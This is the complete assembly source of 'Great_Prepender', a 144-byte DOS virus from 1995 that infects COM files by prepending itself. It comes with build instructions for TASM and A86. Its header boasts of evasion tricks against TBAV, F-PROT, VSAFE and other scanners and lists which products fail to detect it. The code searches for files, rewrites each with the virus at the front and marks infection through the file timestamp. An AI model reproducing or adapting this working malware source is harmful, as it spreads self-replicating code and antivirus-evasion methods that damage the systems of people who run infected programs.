;******************************************************************************
;
; "I'm the great prepender!" - Jest on Queen by Rajaat / Genesis
;
;******************************************************************************
;
; Virus name    : Great_Prepender
; Author        : Rajaat
; Origin        : United Kingdom, December 1995
; Compiling     : Using TASM            | Using A86
;                                       |
;                 TASM /M PREPEND       | A86 PREPEND.ASM
;                 TLINK /T PREPEND      |
; Targets       : COM files
; Size          : 144 bytes
; Resident      : No
; Polymorphic   : No
; Encrypted     : No
; Stealth       : No
; Tunneling     : No - is not needed for some programs
; Retrovirus    : Yes - TBAV, SUSPICIOUS, F-PROT & VSAFE
; Antiheuristics: Yes - TBAV, SUSPICIOUS & F-PROT
; Peculiarities : Shifts the whole file after the virus code
;                 Rewrites the whole file for infection
;                 Avoids TBAV & SUSPICIOUS using a 2 byte signature
; Drawbacks     : Hangs if host is TSR program
;                 Hangs if host jumps to PSP:0
;                 Needs at least 64k free space after host
; Behaviour     : When a COM file infected with Great_Prepender virus is
;                 executed, the virus will search for a COM file in the
;                 current directory that doesn't have a 0 in the seconds
;                 field of the file date/time. The virus will read the entire
;                 file in a block after the current host. Great_Prepender now
;                 creates a new file with the same name and writes itself at
;                 the start of the file, and appends the rest of the host
;                 behind it's own code, thus effectively shifting the whole
;                 host with 144 bytes. The virus will restore the host in a
;                 very peculiar way. It modifies the segment registers in a
;                 way that the host looks if it's aligned at 100h, the normal
;                 address for COM files to start. It then copies most of the
;                 DTA over it's own code and executes the host. The stack
;                 segment is not modified. Because the virus shifts only the
;                 DTA and doesn't change the memory allocation, resident
;                 programs have a chance of crashing, because they don't
;                 allocate 144 bytes of their own code (if function 31h is
;                 used for the allocation). Great_Prepender is targetted at
;                 a few resident behaviour blockers, effectively avoiding them.
;                 The virus also has some tricks to avoid being scanned by a
;                 few antivirus programs that can perform heuristic scanning.
;                 It's unknown what this virus might do besides replicate :)
;******************************************************************************
;
; Results with antivirus software
;
;       TBFILE                    - doesn't trigger
;       TBSCAN                    - flags 'p' (packed file)
;       TBCLEAN                   - can't reconstruct without ANTIVIR.DAT
;       SVS                       - doesn't trigger
;       SSC                       - no flags
;       F-PROT                    - no virus found
;       F-PROT /ANALYSE           - no virus found
;       F-PROT /ANALYSE /PARANOID - unusual code
;       AVP                       - virus type Com suspicion (0 bytes)
;       VSAFE                     - doesn't trigger
;       NEMESIS                   - triggers :(
;
;******************************************************************************
;
; Big hello to : Immortal Riot, VLAD, Phalcon/Skism and everyone on #virus who
;                deserves it to be greeted by me.
;
;******************************************************************************

.model tiny
.code

                org 100h

dta             equ 0fd00h-1eh

;===( Main part of the virus )=================================================
im_the_great_prepender:
                push ax                         ; fool TBSCAN and SSC
                dec bx

                xchg ax,cx
                mov ah,1ah
                mov dx,dta
                int 21h                         ; move dta to end of segment

                mov ah,4eh
find_next:      lea dx,filemask
                int 21h                         ; search COM file
                jc restore_host                 ; go restore_host if seek fails

                mov ah,4fh
                test byte ptr ds:dta+16h,00011111b
                jz find_next                    ; if seconds != 0 go find_next

;===( Infect file )============================================================

                mov ah,3dh
                mov dx,dta+1eh
                int 21h                         ; open file with read access

                xchg ax,bx
                xchg ax,cx
                push ds
                pop ax
                add ah,10h
                push ax
                push ax
                pop ds
                mov ah,3fh
                cwd                             ; read whole file in next
                int 21h                         ; 64k block
                push ax                         ; store file size
                push cs
                pop ds
                mov ah,3eh
                int 21h                         ; close file

                mov ah,3ch
                mov dh,0fdh
                inc cx
                int 21h                         ; create new file (overwrite)

                mov ah,40h
                mov dh,01h
                mov cl,virus_size
                int 21h                         ; write virus

                mov ah,40h
                pop cx
                pop ds
                cwd
                int 21h                         ; write host

                push cs
                pop ds

                mov ax,5701h
                mov cx,word ptr ds:dta+16h
                mov dx,word ptr ds:dta+18h
                and cl,11100000b                ; set seconds to 0 and
                int 21h                         ; restore date/time

                mov ah,3eh
                int 21h                         ; close file

;===( Return to host )=========================================================
restore_host:   push cs                         ; shift the segment
                pop si                          ; and prepare for dta
                add si,09h                      ; transfer.
                push si
                push si
                mov di,100h-(virus_end-reconstruct)
                mov cx,di
                push di
                push si
                pop es
                xor si,si
                mov di,si
                mov dx,80h
                retf                            ; jump to new cs:ip (shifted)

filemask        db '*Rajaat.COM',0              ; file mask and author name

reconstruct:    rep movsb                       ; copy dta to new location
                pop ds                          ; (over virus code)
                mov ah,1ah
                int 21h                         ; set new dta
                pop ax                          ; clear ax

virus_end       equ $
virus_size      equ $-im_the_great_prepender

;===( Original shifted host )==================================================

                mov ax,4c00h
                int 21h

end im_the_great_prepender
